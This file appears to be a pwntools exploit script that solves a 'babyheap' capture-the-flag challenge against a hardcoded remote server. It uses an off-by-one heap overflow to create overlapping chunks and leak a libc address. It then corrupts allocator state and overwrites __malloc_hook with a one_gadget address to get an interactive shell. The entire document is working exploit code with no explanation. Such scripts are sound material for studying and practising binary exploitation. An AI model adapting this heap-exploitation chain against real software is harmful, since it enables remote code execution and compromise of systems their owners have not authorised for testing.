#!/usr/bin/env python
# coding:utf-8

from ctf import *

binary = './babyheap'
context.terminal = ['tmux', 'splitw', '-h']
if not args['ASLR']:
    context.aslr = False
mode = args['MODE'].lower()
# os.environ['LD_LIBRARY_PATH'] = os.curdir

elf = context.binary = ELF(binary)
if args['LIBC']:
    libc = args['LIBC']
    os.environ['LD_PRELOAD'] = os.path.abspath(libc)
else:
    libc = [x for x in elf.libs.keys() if 'libc.so' in x]
    libc = libc and libc[0] or './libc.so.6'
info('libc: %s', libc)
libc = ELF(libc)


def exploit():
    if mode == 'debug':
        io = gdb.debug(binary, gdbscript='''
            c
        ''')
    elif mode == 'remote':
        io = remote('202.120.7.204', 127)
    elif mode == 'qira':
        io = remote('0', 4000)
    else:
        io = process(binary)

    def alloc(size):
        io.sendlineafter('Command: ', '1')
        io.sendlineafter('Size: ', str(size))

    def update(idx, size, content):
        io.sendlineafter('Command: ', '2')
        io.sendlineafter('Index: ', str(idx))
        io.sendlineafter('Size: ', str(size))
        io.sendafter('Content: ', content)

    def delete(idx):
        io.sendlineafter('Command: ', '3')
        io.sendlineafter('Index: ', str(idx))

    def view(idx):
        io.sendlineafter('Command: ', '4')
        io.sendlineafter('Index: ', str(idx))

    alloc(0x58)  # 0
    alloc(0x58)  # 1
    alloc(0x58)  # 2
    alloc(0x58)  # 3
    update(0, 0x59, 'A' * 0x58 + '\xf1')
    update(3, 0x30, 'A' * 0x20 + p64(0) + p64(0x31))
    delete(1)
    alloc(0x58)  # 1

    view(2)
    io.recvuntil(']: ')
    # info('leak %#x', u64(io.recv(8))); exit() # 0x2aaaab097b78 0x7fda37fbeb58
    # libc.address = u64(io.recv(8)) - 0x3c4b78
    libc.address = u64(io.recv(8)) - 0x399B58
    info('libc base address: %#x', libc.address)

    alloc(0x48)  # 4
    alloc(0x38)  # 5
    update(5, 0x10, flat(0, 0x41))
    update(3, 0x40, flat(cyclic(0x38), 0x21))
    delete(3)

    update(5, 0x18, flat(cyclic(0x8), 0x41, 0x61))
    alloc(0x38)

    alloc(0x58)  # 6
    alloc(0x58)  # 7
    alloc(0x58)  # 8
    alloc(0x58)  # 9
    update(6, 0x59, 'A' * 0x58 + '\xf1')
    update(9, 0x30, 'A' * 0x20 + p64(0) + p64(0x31))
    delete(7)
    delete(8)
    alloc(0x48)  # 7

    alloc(0x48)  # 8
    # update(8, 0x18, flat(0, 0x61, libc.address + 0x3c4b30))
    update(8, 0x18, flat(0, 0x61, libc.address + 0x399B10))
    alloc(0x58)  # 10
    alloc(0x58)  # 11

    # TODO: &__malloc_hook - 0x10
    # update(11, 0x58, flat('\0' * 0x38, libc.address + 0x3c4b00, libc.address + 0x3c4b00, libc.address + 0x3c4b78, libc.address + 0x3c4b78))
    update(11, 0x58,
           flat('\0' * 0x38, libc.address + 0x399ae0, libc.address + 0x399ae0,
                libc.address + 0x399B58, libc.address + 0x399B58))

    alloc(0x18)  # 12
    # update(12, 0x8, p64(libc.address + 0x4526a))
    update(12, 0x8, p64(libc.address + 0x3f35a))

    alloc(0x18)

    # gdb.attach(io, '''
    # ''')

    io.interactive()


if __name__ == '__main__':
    exploit()
